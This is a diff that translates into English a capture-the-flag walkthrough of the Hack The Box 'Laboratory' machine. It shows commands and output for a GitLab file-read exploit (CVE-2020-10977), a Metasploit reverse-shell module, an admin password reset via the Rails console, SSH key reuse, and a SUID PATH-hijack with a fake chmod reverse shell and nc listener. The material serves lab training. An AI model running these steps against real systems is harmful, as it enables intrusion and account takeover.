@@ -1,6 +1,6 @@
 ---
 title: 'Walktrough: HTB Laboratory'
-language: pt-BR
+language: en-US
 localeid: htb-laboratory
 date: 2021-04-17T16:00:00.000Z
 tags:
@@ -15,18 +15,18 @@ authors:
   - default
 ---
 
-Olá pessoal!
+Hello everyone!
 
-A máquina desta semana será **Laboratory**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xc45](https://app.hackthebox.eu/users/73268).
+The machine of this week will be **Laboratory**, another Linux box easy rated from [Hack The Box](https://www.hackthebox.eu), created by [0xc45](https://app.hackthebox.eu/users/73268).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
+\:information\_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired.
 \[info]
 
 ![HTB Laboratory](https://i.imgur.com/ayRi3eJ.png)
 
-## Enumeração
+## Enumeration
 
-Conforme de costume, iniciamos com a enumeração básica dos serviços utilizando o `nmap` com um quick scan:
+As usual, we start with published services enumeration using a `nmap` quick scan:
 
 ```bash
 $ nmap -sC -sV -Pn -oA quick 10.10.10.216                                                                   
@@ -59,25 +59,25 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds
 ```
 
-Após execução notamos que existem, além do serviço de SSH, dois serviços HTTP (HTTP e HTTPs em suas respectivas portas padrão) que fazem menção às entradas de DNS `laboratory.htb` e `git.laboratory.htb`, os quais foram incluidos no arquivo hosts da máquina para melhor enumeração destes serviços.
+After running it, noticed that besides the SSH service, 2 HTTP services (HTTP and HTTPS) were published in their default ports and the certificate for the HTTPS service mentions 2 DNS entries, which were added to the local hosts file to enumerate them properly: `laboratory.htb` e `git.laboratory.htb`.
 
-### 80/TCP - Serviço HTTP
+### 80/TCP - HTTP Service
 
-Uma vez acessado serviço HTTP tanto no IP quanto em qualquer um dos DNS que pudemos observar de acordo com o scan do `nmap`, ocorre um redirecionamento para o HTTPS, que funciona na porta 443/TCP, que será discutido a seguir.
+Accessing this service from IP and any of the DNS entries, noticed that there's a redirection to HTTPS, which will be discussed in the next section.
 
-### 443/TCP - Serviço HTTPS
+### 443/TCP - HTTPS Service
 
-Ao enumerar os serviços HTTPS em ambos os DNS, pudemos notar algumas diferenças nos serviços publicados.
+After starting the enumeration, noticed that for each DNS entry published, we have a different service available.
 
 ### `https://laboratory.htb`
 
-Ao navegar para a página `https://laboratory.htb`, temos um site institucional relacionado a uma empresa de segurança com Dexter, Dee Dee e Anonymous como funcionários, porém nenhum link interessante para dar continuidade na exploração.
+Accessing this webpage, we have an institutional website from a company called Laboratory where Dexter, Dee Dee, and Anonymous are the employees, but nothing interesting was found during the validation.
 
 ![laboratory htb](https://i.imgur.com/dlEIkOK.png)
 
 #### Gobuster
 
-Para verificar se alguma outra página existe neste website, realizei o scan utilizando o `gobuster` porém nada interessante foi encontrado.
+To make sure that anything else is hidden on this website, started scanning using `gobuster` dir mode, but anything interesting was found.
 
 ```bash
 $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://laboratory.htb -x html,php,txt -k
@@ -104,11 +104,11 @@ Progress: 38301 / 220561 (17.37%)
 
 ### `https://git.laboratory.htb`
 
-Uma vez acessado o serviço, notado que se tratava de um servidor [GitLab](https://about.gitlab.com/), conforme podemos ver na imagem abaixo.
+As the other DNS entry gave us almost nothing, decided to poke a little with the `git` subdomain, where we can see an instance of [GitLab](https://about.gitlab.com/) Server, as below.
 
 ![gitab laboratory htb](https://i.imgur.com/CNEzXqQ.png)
 
-Após algumas pesquisas, notei que na API V3 seria possivel realizar algumas enumerações não autenticadas, o que não foi possível neste caso, já que neste caso temos uma API V4.
+After some research, found that API V2 would disclose some information in an unauthenticated way but this enumeration has also resulted in nothing, once the GitLab Server has an API V4 which fixes the issues found.
 
 ```bash
 $ curl -L https://git.laboratory.htb/api/v3/internal/check -k                                               
@@ -118,19 +118,19 @@ $ curl -L https://git.laboratory.htb/api/v4/internal/check -k
 {"message":"401 Unauthorized"}
 ```
 
-Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (*laboratory.htb*) mas que mesmo assim foi criada com sucesso.
+As using the enumeration method, I found also didn't work, decided to try creating an account on the instance and had success, besides being mandatory to use an e-mail belonging to an authorized domain (*laboratory.htb*) but no confirmation was required.
 
-Uma vez logado com a conta recém-criada, segui para a exploração dos repositórios públicos, onde encontrei um repositório chamado **SecureWebSite**.
+Once logged in with the newly created account, started browsing the public repositories where I found the **SecureWebSite**.
 
 ![gitlab projects](https://i.imgur.com/DXQzBKY.png)
 
-Ao navegar no repositório, pude notar de que se tratava do site publicado na URL `https://laboratory.htb`, de onde poderíamos obter alguma informação interessante, porém conforme já era esperado se trata apenas de um single page application sem funcionalidades que pudéssemos explorar.
+This repository belongs to the website published to `https://laboratory.htb`, where we would be able to get some interesting information if it weren't a single-page application.
 
-Entretanto, uma vez logado no portal, ao acessar o menu *Help > Help* podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community
+Once we had logon rights now to GitLab, decided to look for the server instance running, where under *Help > Help* we could identify version 12.8.1 Community for this implementation.
 
 ![gitlab version](https://i.imgur.com/L1Oaxuy.png)
 
-Buscando no `searchsploit` encontradas algumas vulnerabilidades que poderiam ser exploradas, identificadas como **Arbitrary File Read**.
+Searching using `searchsploit` I have found some vulnerabilities that could be explored, identified as **Arbitrary File Read**.
 
 ```bash
 $ searchsploit gitlab
@@ -151,9 +151,9 @@ NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution        | json/we
 Shellcodes: No Results
 ```
 
-Após algumas tentativas com os scripts do searchsploit não obtive o sucesso esperado. Em nova busca acabei encontrando o [CVE-2020-10977 no MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977) que está relacionado à esta vulnerabilidade e, a partir desta informação, encontrei outros exploits a serem testados, sendo o disponível no repositório [thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)](https://github.com/thewhiteh4t/cve-2020-10977) o utilizado.
+After a few attempts I had no success with the provided scripts. Researching a little more, I came across [CVE-2020-10977 in MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977) which is related to the vulnerability we're trying to abuse and, after finding it, I found another exploit in GitHub in [thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)](https://github.com/thewhiteh4t/cve-2020-10977) which was later used.
 
-Com este script, pude confirmar que o servidor continua vulnerável à exploração conforme possibilidade de obter o arquivo `/etc/passwd`.
+With this script we were able to confirm that it is vulnerable and be able to read the `/etc/passwd`.
 
 ```bash
 $ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
@@ -187,7 +187,7 @@ $ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd
 > /etc/passwd
 ```
 
-Verificando o conteúdo do `/etc/passwd` podemos notar que os usuários desta máquina, além de *root* e *ssh* foram criados e utilizam basicamente a mesma raiz de diretório em `/var/opt/gitlab`, onde vamos buscar por arquivos interessantes
+Checking the contents of `/etc/passwd` we can see that the users of this box, besides *root* and *ssh* share the `/var/opt/gitlab` in their home paths, where we'll look for interesting files.
 
 ```bash
 $ cat etc_passwd | grep sh | awk -F":" '{print $6","$1}'
@@ -203,7 +203,7 @@ $ cat etc_passwd | grep sh | awk -F":" '{print $6","$1}'
 
 ## Initial Foothold
 
-Já sabendo das contas da máquina e da possibilidade de leitura de arquivos arbitrários, pesquisei sobre como converter essa possibilidade em RCE, para assim obter um shell reverso. Após algumas leituras encontrei [um módulo do Metasploit](https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/) que se utiliza desta mesma vulnerabilidade para obter o `secret_key_base` do GitLab, e assim, com uma chamada de deserialization do cookie emitido, obter um shell reverso com a conta **git**.
+Already knowing about a few accounts and the possibility to read files in arbitrarily, I was searching how to convert this LFI to an RCE, to be able to get a reverse shell in this box. After some research I have found [a Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/) that makes use of this same vulnerability to obtain the `secret_key_base` from GitLab, and, with a deserialization call in the obtained cookie, obtain a reverse shell as the running account, in this case **git**.
 
 ```bash
 msf6 exploit(multi/http/gitlab_file_read_rce) > run
@@ -231,12 +231,12 @@ uid=998(git) gid=998(git) groups=998(git)
 
 ## User flag
 
-Com acesso à máquina iniciada enumeração utilizando o `linpeas.sh` do [PEAS Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md) que me ajudou muito a entender as possibilidades de exploração do GitLab, uma vez que não conheço bem a implementação do serviço. O Script detecta o serviço instalado e trouxe algumas informações interessantes sobre a máquina em questão:
+With access to the machine, started enumerating using `linpeas.sh` from [PEAS Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md). This helped me a lot once I could learn the possibilities while exploiting a GitLab server. The script detects that the service is installed and returned some interesting information about the machine itself:
 
-* Enumeração das contas, onde pudemos notar que o usuário **dexter** ([admin@example.com](mailto\:admin@example.com)) é administrador.
-* Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.
+* GitLab accounts, where **dexter** ([admin@example.com](mailto\:admin@example.com)) is an administrator.
+* We are running from a docker container, where we might be required to escape it to exploit the machine itself.
 
-Um dos pontos colocados pelo `linpeas.sh` durante a enumeração é a possibilidade de alterar a senha de qualquer usuário, o que tivemos sucesso a partir da execução dos comandos abaixo:
+One of the possibilities listed by `linpeas.sh` is that we could change the password from any user, which was successfully done for dexter after running the commands below:
 
 ```bash
 git@git:~/gitlab-rails$ gitlab-rails console
@@ -258,15 +258,15 @@ Enqueued ActionMailer::DeliveryJob (Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293
 irb(main):005:0> 
 ```
 
-Após alterada a senha, foi possível visualizar para a conta `dexter` um repositório privado adicional chamado **SecureDocker**.
+After changed its password, I was able to login with his account and see other repositories in his shoes, where we found a **SecureDocker** private repo, which called a lot of attention.
 
 ![gitlab dexter projects](https://i.imgur.com/sxEzY97.png)
 
-Já que temos acesso ao código-fonte do repositório, notado que existem alguns scripts e **chave SSH** do usuário dexter, conforme mencionado na descrição do repositório.
+Once we have access to the source code, downloaded its contents and found some interesting information used to build the container and a **SSH key** from dexter under his personal stuff, as mentioned in repo's description.
 
 > CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I'll figure that out later.
 
-Após clonar o repositório para máquina local observados os seguintes arquivos.
+After cloning it, we were able to see the following information:
 
 ```bash
 $ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git  
@@ -296,7 +296,7 @@ $ tree -a -I '.git'
 2 directories, 6 files
 ```
 
-Assim como na máquina <Link href="/blog/2021/03/htb-luanne">Luanne</Link>), realizado a conversão da chave para RSA, utilizando os comandos abaixo:
+Just like we did on [Luanne](/en-US/blog/2021/03/htb--luanne), we have converted it to an RSA key using the commands below:
 
 ```bash
 $ chmod 600 id_rsa
@@ -307,7 +307,7 @@ Enter same passphrase again:
 Your identification has been saved with the new passphrase.
 ```
 
-Após o procedimento mencionado, foi possível conectar-se à máquina via SSH e obter a flag a partir do usuário `dexter`.
+After the mentioned process, I was able to SSH to the machine and get the user flag under Dexter's account:
 
 ```bash
 $ ssh -i id_rsa dexter@10.10.10.216
@@ -330,21 +330,21 @@ dexter@laboratory:~$ cat user.txt
 
 ## Root flag
 
-Após executar `linpeas.sh` novamente, desta vez na máquina de fato, notei que existe um arquivo SUID, com permissão atribuida para o usuário **dexter**.
+After running `linpeas.sh` again, this time in the real machine, noticed that there's an SUID file with permissions attributed to the user **dexter**.
 
 ```bash
 dexter@laboratory:~$ ls -la /usr/local/bin/docker-security
 -rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
 ```
 
-Ao executar este binário, não observei nenhum output, assim como não exibe nenhum tipo de informação/ajuda usando parametros como `--version` e `--help`. Analisando o mesmo mais a fundo notei que se trata de um arquivo executável, o qual pode conter alguma informação do que se utiliza para algum eventual path hijack ou buffer overflow.
+Executing this binary, I couldn't see any output, as well as no information/help is shown when used parameters like `--version` and `--help`. Analyzing the binary further, noticed that it's an ELF, which could be abused somehow using a path hijack or buffer overflow.
 
 ```bash
 dexter@laboratory:~$ file /usr/local/bin/docker-security
 /usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped
 ```
 
-Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário `strings`) e algumas entradas chamaram a atenção, sendo elas a chamada do binário `chmod` para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app **é vulnerável *path hijacking***.
+Before using disassembly tools, inspected the files strings from the attacker machine (once `strings` wasn't available in this box) and some entries called attention: two calls to `chmod` to redefine docker directories permissions, but without specifying the full path to the binary, confirming the suspicion that **it is vulnerable to path hijacking**.
 
 ```bash
 $ strings docker-security
@@ -361,7 +361,7 @@ GCC: (Debian 10.1.0-6) 10.1.0
 
 ### Path hijack
 
-Para obter privilégios de `root`, uma vez que o binário que possui SUID é vulnerável, o primeiro passo é criar um `chmod` **falso**, neste caso gerando um shell reverso, seguido da alteração do PATH para que o caminho onde o arquivo localizado seja buscado no início da execução.
+To get `root` privileges, the first step is to create a fake `chmod`, in this case to return a reverse shel to the attacker machine. After that we need to modify user's PATH variable so we can call our own chmod file instead of the one previously installed. The steps below achieve the tasks mentioned:
 
 ```bash
 dexter@laboratory:~$ echo '#!/bin/bash' > /dev/shm/chmod
@@ -372,7 +372,7 @@ dexter@laboratory:~$ echo $PATH
 /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
 ```
 
-Após configurar um listener na porta especificada (`nc -lnvp 4443`) executado o binário `docker-security` o que retornou um shell reverso com privilégios de **root**, permitindo assim a obtenção da flag.
+After starting the listener in the port defined in the fake chmod binary (`nc -lnvp 4443`), executed `docker-security` which gave us the very expected root access, allowing us to read the root flag.
 
 ```bash
 $ nc -lnvp 4443                                                                                             
@@ -386,6 +386,6 @@ cat /root/root.txt
 <redacted>
 ```
 
-Espero que tenham gostado!
+I hope you guys have enjoyed this box resolution.
 
-Vejo vocês novamente em breve! \:smiley:
+See you in the next post soon! \:smiley:
